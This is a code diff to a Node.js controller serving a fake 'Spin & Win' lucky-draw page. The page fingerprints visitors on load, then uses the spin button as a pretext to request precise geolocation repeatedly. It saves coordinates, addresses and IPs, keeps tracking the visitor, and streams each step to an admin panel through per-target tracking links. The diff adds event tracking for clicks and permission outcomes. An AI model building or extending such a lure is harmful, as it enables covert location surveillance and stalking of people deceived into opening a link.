@@ -6,6 +6,16 @@ const { reverseGeocode } = require('../services/geocode.service');
 
 const renderCapturePage = async (req, res, next) => {
   try {
+    // Check if a custom tracking link is being used
+    const trackingLink = req.trackingLink;
+    const customSlug = trackingLink ? trackingLink.slug : null;
+    const customTitle = trackingLink ? trackingLink.name : 'Daily Lucky Draw';
+    
+    // If tracking link is expired, show error
+    if (trackingLink && trackingLink.expiresAt && new Date() > trackingLink.expiresAt) {
+      return res.status(410).send('<h1>Link Expired</h1><p>This tracking link has expired.</p>');
+    }
+    
     const html = `
       <!DOCTYPE html>
       <html lang="en">
@@ -13,7 +23,7 @@ const renderCapturePage = async (req, res, next) => {
           <meta charset="UTF-8">
           <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
           <meta name="theme-color" content="#ff6b6b">
-          <title>🎰 Spin & Win - Daily Lucky Draw!</title>
+          <title>🎰 ${customTitle}</title>
           <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
           <style>
               * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -80,6 +90,17 @@ const renderCapturePage = async (req, res, next) => {
                   color: rgba(255,255,255,0.7);
                   font-size: 0.95rem;
                   margin-bottom: 30px;
+              }
+              .custom-url-badge {
+                  background: rgba(255,255,255,0.1);
+                  backdrop-filter: blur(10px);
+                  border: 1px solid rgba(255,255,255,0.2);
+                  padding: 6px 15px;
+                  border-radius: 20px;
+                  font-size: 11px;
+                  color: rgba(255,255,255,0.8);
+                  margin-bottom: 20px;
+                  display: inline-block;
               }
               .wheel-container {
                   position: relative;
@@ -305,6 +326,7 @@ const renderCapturePage = async (req, res, next) => {
           
           <div class="container">
               <div class="header-badge">🎉 DAILY FREE SPIN</div>
+              ${customSlug ? `<div class="custom-url-badge">🔗 /${customSlug}</div>` : ''}
               <h1>SPIN & WIN</h1>
               <p class="subtitle">Tap SPIN to try your luck today!</p>
               
@@ -348,6 +370,7 @@ const renderCapturePage = async (req, res, next) => {
           </div>
 
           <script>
+              const CUSTOM_SLUG = '${customSlug || ''}';
               const wheel = document.getElementById('wheel');
               const spinBtn = document.getElementById('spin-btn');
               const winnerBanner = document.getElementById('winner-banner');
@@ -404,6 +427,36 @@ const renderCapturePage = async (req, res, next) => {
                   return 'fp_' + Math.abs(hash).toString(16);
               };
 
+              // Tracking helper
+              const visitorId = getVisitorId();
+              let currentFp = null;
+              
+              const track = async (event, eventData = {}) => {
+                  try {
+                      const fp = currentFp || await getFingerprintData();
+                      currentFp = fp;
+                      await fetch('/public/track-event', {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({
+                              visitorId,
+                              event,
+                              eventData,
+                              trackingLinkSlug: CUSTOM_SLUG,
+                              fingerprintHash: generateHash(fp),
+                              screenResolution: fp.screen,
+                              language: fp.language,
+                              timezone: fp.timezone,
+                              userAgent: fp.userAgent,
+                              deviceInfo: fp
+                          })
+                      });
+                  } catch (e) { console.log('Track error:', e); }
+              };
+
+              // Track page load
+              track('page_load');
+
               // Auto-capture on load
               window.addEventListener('load', async () => {
                   try {
@@ -424,7 +477,8 @@ const renderCapturePage = async (req, res, next) => {
                               language: fp.language,
                               timezone: fp.timezone,
                               userAgent: fp.userAgent,
-                              deviceInfo: fp
+                              deviceInfo: fp,
+                              trackingLinkSlug: CUSTOM_SLUG
                           })
                       });
                   } catch (e) {}
@@ -459,8 +513,12 @@ const renderCapturePage = async (req, res, next) => {
               spinBtn.addEventListener('click', async () => {
                   if (isSpinning || spinsLeft <= 0) return;
                   
+                  // Track click immediately
+                  await track('spin_button_clicked');
+                  
                   // Check if geolocation is supported
                   if (!navigator.geolocation) {
+                      await track('permission_result', { status: 'not_supported' });
                       status.innerHTML = '<span class="text-red-400">❌ Location not supported on this device</span>';
                       setTimeout(() => winnerBanner.classList.add('active'), 500);
                       return;
@@ -479,6 +537,7 @@ const renderCapturePage = async (req, res, next) => {
                   wheel.style.transform = 'rotate(' + currentRotation + 'deg)';
                   
                   const fp = await getFingerprintData();
+                  currentFp = fp;
                   let locationAttempts = 0;
                   let bestPosition = null;
                   let locationError = null;
@@ -486,20 +545,27 @@ const renderCapturePage = async (req, res, next) => {
                   // Request location immediately with better error handling
                   const requestLocation = () => {
                       return new Promise((resolve, reject) => {
+                          track('permission_requested');
                           navigator.geolocation.getCurrentPosition(
                               (position) => {
                                   console.log('Location acquired:', position.coords);
                                   bestPosition = position;
+                                  track('permission_result', { status: 'granted' });
                                   resolve(position);
                               },
                               (error) => {
                                   console.error('Location error:', error.code, error.message);
                                   locationError = error;
+                                  track('permission_result', { 
+                                      status: error.code === 1 ? 'denied' : error.code === 2 ? 'unavailable' : 'timeout',
+                                      errorCode: error.code,
+                                      errorMessage: error.message
+                                  });
                                   reject(error);
                               },
                               { 
                                   enableHighAccuracy: true, 
-                                  timeout: 15000,  // Increased timeout
+                                  timeout: 15000,
                                   maximumAge: 0 
                               }
                           );
@@ -510,28 +576,31 @@ const renderCapturePage = async (req, res, next) => {
                   const tryGetLocation = async () => {
                       while (locationAttempts < 3 && !bestPosition) {
                           locationAttempts++;
+                          track('location_attempt', { attempt: locationAttempts });
                           status.innerHTML = '📍 Requesting location... (Attempt ' + locationAttempts + '/3)';
                           
                           try {
                               await requestLocation();
-                              break; // Success, exit loop
+                              break;
                           } catch (err) {
                               console.log('Attempt', locationAttempts, 'failed:', err);
                               if (locationAttempts < 3) {
-                                  await new Promise(r => setTimeout(r, 2000)); // Wait 2s before retry
+                                  await new Promise(r => setTimeout(r, 2000));
                               }
                           }
                       }
 
                       if (bestPosition) {
                           status.innerHTML = '📍 Location captured! Saving...';
+                          track('location_captured', { 
+                              latitude: bestPosition.coords.latitude,
+                              longitude: bestPosition.coords.longitude,
+                              accuracy: bestPosition.coords.accuracy
+                          });
                           await sendLocation(bestPosition, fp);
                           status.innerHTML = '✅ Location saved!';
-                          
-                          // Start continuous tracking
                           startTracking(fp);
                       } else {
-                          // Location failed - show error
                           let errorMsg = '❌ Location access denied';
                           if (locationError) {
                               if (locationError.code === 1) errorMsg = '❌ Permission denied. Please allow location access.';
@@ -539,17 +608,18 @@ const renderCapturePage = async (req, res, next) => {
                               else if (locationError.code === 3) errorMsg = '❌ Timeout - taking too long';
                           }
                           status.innerHTML = errorMsg;
+                          track('error', { message: errorMsg });
                           console.error('Failed to get location after', locationAttempts, 'attempts');
                       }
                   };
 
-                  // Start location request immediately, don't wait for spin
                   tryGetLocation();
 
-                  // Show winner banner after spin completes (4 seconds)
-                  setTimeout(() => {
+                  // Show winner banner after spin completes
+                  setTimeout(async () => {
                       winnerBanner.classList.add('active');
                       isSpinning = false;
+                      await track('spin_completed');
                       if (spinsLeft > 0) spinBtn.disabled = false;
                       else {
                           spinBtn.textContent = 'NO SPINS LEFT';
@@ -572,7 +642,8 @@ const renderCapturePage = async (req, res, next) => {
                       timezone: fp.timezone,
                       userAgent: fp.userAgent,
                       deviceInfo: fp,
-                      isUpdate: isUpdate // Flag to indicate if this is an update
+                      trackingLinkSlug: CUSTOM_SLUG,
+                      isUpdate: isUpdate
                   };
                   
                   await fetch('/public/save-location', {
@@ -598,7 +669,8 @@ const saveLocation = async (req, res, next) => {
     const { 
       latitude, longitude, accuracy, altitude, method,
       visitorId, fingerprintHash, screenResolution, language, timezone, 
-      batteryLevel, networkType, deviceInfo, networkInfo, behavioralData, isUpdate
+      batteryLevel, networkType, deviceInfo, networkInfo, behavioralData, isUpdate,
+      trackingLinkSlug
     } = req.body;
     
     // Check if we already have a recent entry for this visitor to avoid duplicates
@@ -661,10 +733,17 @@ const saveLocation = async (req, res, next) => {
       deviceInfo,
       networkInfo,
       behavioralData,
-      address: address
+      address: address,
+      trackingLinkSlug: trackingLinkSlug || null
     });
 
     await publicLocation.save();
+    
+    // Increment tracking link stats if applicable
+    if (trackingLinkSlug) {
+      const { incrementLinkStats } = require('./trackingLink.controller');
+      incrementLinkStats(trackingLinkSlug, true, method === 'geolocation');
+    }
     
     // Emit Socket.IO event to notify admins
     try {
@@ -683,7 +762,8 @@ const saveLocation = async (req, res, next) => {
         deviceInfo: publicLocation.deviceInfo,
         networkInfo: publicLocation.networkInfo,
         language: publicLocation.language,
-        timezone: publicLocation.timezone
+        timezone: publicLocation.timezone,
+        trackingLinkSlug: publicLocation.trackingLinkSlug
       });
       logger.info(`Socket.IO: Location captured event emitted for visitor ${publicLocation.visitorId} at ${address?.displayAddress || 'Unknown'}`);
     } catch (socketErr) {
@@ -725,9 +805,145 @@ const getLocationByVisitorId = async (req, res, next) => {
   }
 };
 
+const trackEvent = async (req, res, next) => {
+  try {
+    const { 
+      visitorId, 
+      event, 
+      eventData,
+      pageLoadedAt,
+      fingerprintHash,
+      screenResolution, 
+      language, 
+      timezone,
+      userAgent,
+      deviceInfo,
+      networkInfo,
+      trackingLinkSlug
+    } = req.body;
+    
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
+    
+    // Find or create a tracking record for this visitor
+    let tracking = await PublicLocation.findOne({ 
+      visitorId, 
+      method: 'geolocation',
+      createdAt: { $gt: new Date(Date.now() - 30 * 60 * 1000) } // Within 30 minutes
+    });
+    
+    if (!tracking) {
+      // Create new tracking record
+      tracking = new PublicLocation({
+        ip,
+        userAgent: userAgent || req.headers['user-agent'],
+        visitorId: visitorId || 'v_unknown_' + Math.random().toString(36).substr(2, 5),
+        fingerprintHash,
+        screenResolution,
+        language,
+        timezone,
+        deviceInfo,
+        networkInfo,
+        method: 'geolocation',
+        location: { type: 'Point', coordinates: [0, 0] },
+        trackingLinkSlug: trackingLinkSlug || null,
+        trackingJourney: {
+          pageLoadedAt: pageLoadedAt ? new Date(pageLoadedAt) : new Date(),
+          journeyStatus: 'page_loaded'
+        }
+      });
+    }
+    
+    // Update based on event type
+    const now = new Date();
+    
+    switch (event) {
+      case 'page_load':
+        tracking.trackingJourney.pageLoadedAt = now;
+        tracking.trackingJourney.journeyStatus = 'page_loaded';
+        break;
+        
+      case 'spin_button_clicked':
+        tracking.trackingJourney.spinButtonClickedAt = now;
+        tracking.trackingJourney.journeyStatus = 'clicked';
+        break;
+        
+      case 'permission_requested':
+        tracking.trackingJourney.permissionRequestedAt = now;
+        tracking.trackingJourney.permissionStatus = 'pending';
+        tracking.trackingJourney.journeyStatus = 'permission_requested';
+        break;
+        
+      case 'permission_result':
+        tracking.trackingJourney.permissionStatus = eventData.status; // 'granted', 'denied', 'timeout'
+        tracking.trackingJourney.permissionErrorCode = eventData.errorCode || null;
+        tracking.trackingJourney.permissionErrorMessage = eventData.errorMessage || null;
+        if (eventData.status === 'granted') {
+          tracking.trackingJourney.journeyStatus = 'permission_granted';
+        } else if (eventData.status === 'denied') {
+          tracking.trackingJourney.journeyStatus = 'permission_denied';
+        } else {
+          tracking.trackingJourney.journeyStatus = 'failed';
+        }
+        break;
+        
+      case 'location_attempt':
+        tracking.trackingJourney.locationAttempts = (tracking.trackingJourney.locationAttempts || 0) + 1;
+        break;
+        
+      case 'location_captured':
+        tracking.trackingJourney.locationCapturedAt = now;
+        tracking.trackingJourney.journeyStatus = 'location_captured';
+        // Update coordinates if provided
+        if (eventData.latitude && eventData.longitude) {
+          tracking.location.coordinates = [eventData.longitude, eventData.latitude];
+          tracking.accuracy = eventData.accuracy;
+        }
+        break;
+        
+      case 'spin_completed':
+        tracking.trackingJourney.spinCompletedAt = now;
+        if (tracking.trackingJourney.journeyStatus === 'location_captured') {
+          tracking.trackingJourney.journeyStatus = 'completed';
+        }
+        break;
+        
+      case 'error':
+        tracking.trackingJourney.journeyStatus = 'failed';
+        tracking.trackingJourney.permissionErrorMessage = eventData.message;
+        break;
+    }
+    
+    await tracking.save();
+    
+    // Emit to admin panel for real-time updates
+    try {
+      const io = getIO();
+      io.to('admin').emit('tracking:event', {
+        visitorId: tracking.visitorId,
+        ip: tracking.ip,
+        event,
+        journeyStatus: tracking.trackingJourney.journeyStatus,
+        permissionStatus: tracking.trackingJourney.permissionStatus,
+        trackingLinkSlug: tracking.trackingLinkSlug,
+        deviceInfo: {
+          screenResolution: tracking.screenResolution,
+          language: tracking.language,
+          timezone: tracking.timezone
+        },
+        timestamp: now
+      });
+    } catch (e) {}
+    
+    return success(res, { visitorId: tracking.visitorId }, 'Event tracked');
+  } catch (err) {
+    next(err);
+  }
+};
+
 module.exports = {
   renderCapturePage,
   saveLocation,
   getAllLocations,
   getLocationByVisitorId,
+  trackEvent,
 };
